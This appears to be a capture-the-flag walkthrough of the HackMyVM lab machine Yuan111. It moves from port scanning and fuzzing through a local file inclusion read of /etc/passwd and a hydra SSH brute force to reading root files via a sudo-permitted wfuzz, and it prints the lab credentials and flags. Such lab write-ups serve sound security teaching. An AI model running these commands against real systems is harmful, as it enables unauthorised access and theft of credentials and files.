# HackMyVM - Yuan111 Walkthrough

## Machine Information

| Field            | Value          |
| ---------------- | -------------- |
| Machine Name     | Yuan111        |
| Platform         | HackMyVM       |
| Difficulty       | Easy           |
| Operating System | Linux          |
| Attacker Machine | Kali Linux     |
| Target IP        | 192.168.56.118 |

---

# Overview

Today we are solving **Yuan111**, an easy Linux machine from HackMyVM.

This machine focuses on:

* Web Enumeration
* Local File Inclusion (LFI)
* User Enumeration
* SSH Password Brute Force
* Privilege Escalation via Misconfigured Sudo Permissions
* Arbitrary File Read

---

# Initial Enumeration

## Nmap Scan

Started with a full TCP port scan.

```bash
nmap -p- --min-rate 5000 192.168.56.118
```

### Results

```text
22/tcp open  ssh
80/tcp open  http
```

Only two ports were exposed:

* SSH (22)
* HTTP (80)

---

## Service Detection

Performed a version detection scan.

```bash
nmap -sC -sV 192.168.56.118
```

### Results

```text
22/tcp open  ssh
OpenSSH 8.4p1 Debian

80/tcp open  http
Apache httpd 2.4.62 Debian
```

The web server title suggested information related to the famous RockYou password list.

---

# Web Enumeration

Visiting the homepage revealed a page discussing the RockYou password dictionary.

Since nothing immediately useful was visible, further enumeration was performed.

---

## Directory & File Fuzzing

Used Gobuster to discover hidden files.

```bash
gobuster dir \
-u http://192.168.56.118/ \
-w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
```

### Results

```text
/index.html
/file.php
```

Interesting discovery:

```text
file.php
```

When visited directly:

```text
http://192.168.56.118/file.php
```

The page appeared blank.

---

# Local File Inclusion Discovery

The filename strongly suggested a file inclusion parameter.

Testing for LFI:

```text
http://192.168.56.118/file.php?file=/etc/passwd
```

Success.

The contents of `/etc/passwd` were displayed.

---

## User Enumeration

Reviewing the passwd file revealed a valid local user:

```text
tao:x:1000:1000:,,,:/home/tao:/bin/bash
```

Identified username:

```text
tao
```

---

# SSH Password Attack

Since the website revolved around RockYou and a valid user account was discovered, a password brute-force attack was performed.

```bash
hydra -l tao -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.118
```

### Result

```text
login: tao
password: rockyou
```

Valid credentials obtained:

```text
Username: tao
Password: rockyou
```

---

# Initial Access

Connected via SSH.

```bash
ssh tao@192.168.56.118
```

After successful login, retrieved the user flag.

```bash
cat user.txt
```

### User Flag

```text
flag{user-21747e1ca09bfcc4f2551263db0f3dff}
```

---

# Privilege Escalation

## Sudo Enumeration

Checked sudo permissions.

```bash
sudo -l
```

### Results

```text
User tao may run the following commands on 111:

(ALL) NOPASSWD: /usr/bin/wfuzz
(ALL) NOPASSWD: /usr/bin/id
```

Interesting finding:

```text
wfuzz
```

was executable as root without requiring a password.

---

# Understanding the Vulnerability

Wfuzz supports reading payloads from files using:

```bash
-z file,<filename>
```

To verify this behavior, a local test file was created.

```bash
echo "hello this side kabir" > test.txt
```

Executed:

```bash
sudo /usr/bin/wfuzz \
-z file,test.txt \
http://localhost/FUZZ
```

Output:

```text
"hello this side kabir"
```

This confirmed that Wfuzz reads file contents and displays them as payloads.

---

# Reading Root Files

Since Wfuzz was running with root privileges through sudo, it could access files normally unavailable to the user.

Attempted to read:

```bash
sudo wfuzz \
-z file,/root/root.txt \
http://localhost/FUZZ
```

### Output

```text
flag{root-9bbd7af2a042a901b92dc203b3896621}
```

Root flag successfully disclosed.

---

# Root Flag

```text
flag{root-9bbd7af2a042a901b92dc203b3896621}
```

---

# Attack Path Summary

```text
Port Scan
    ↓
HTTP Enumeration
    ↓
Discovery of file.php
    ↓
LFI Vulnerability
    ↓
Read /etc/passwd
    ↓
Discover User "tao"
    ↓
Hydra Brute Force
    ↓
SSH Access
    ↓
sudo -l
    ↓
Misconfigured Wfuzz Privileges
    ↓
Arbitrary File Read as Root
    ↓
Read /root/root.txt
    ↓
ROOT
```

---

# Lessons Learned

### Local File Inclusion (LFI)

LFI vulnerabilities can expose sensitive files such as:

* /etc/passwd
* SSH keys
* Configuration files
* Application source code

---

### Weak Credentials

The machine intentionally hinted at the RockYou wordlist, leading directly to successful credential guessing.

Always enforce:

* Strong passwords
* Password policies
* MFA where possible

---

### Dangerous Sudo Permissions

Granting tools like Wfuzz root execution rights can create unintended file read capabilities.

Administrators should carefully review:

```bash
sudo -l
```

configurations and avoid allowing unnecessary binaries to run as root.

---

# Flags

## User

```text
flag{user-21747e1ca09bfcc4f2551263db0f3dff}
```

## Root

```text
flag{root-9bbd7af2a042a901b92dc203b3896621}
```

---

# Conclusion

Yuan111 is a beginner-friendly HackMyVM machine that demonstrates how a simple Local File Inclusion vulnerability can lead to complete system compromise. By combining web enumeration, user discovery, password brute-forcing, and abuse of misconfigured sudo permissions, full access to the target system was achieved.
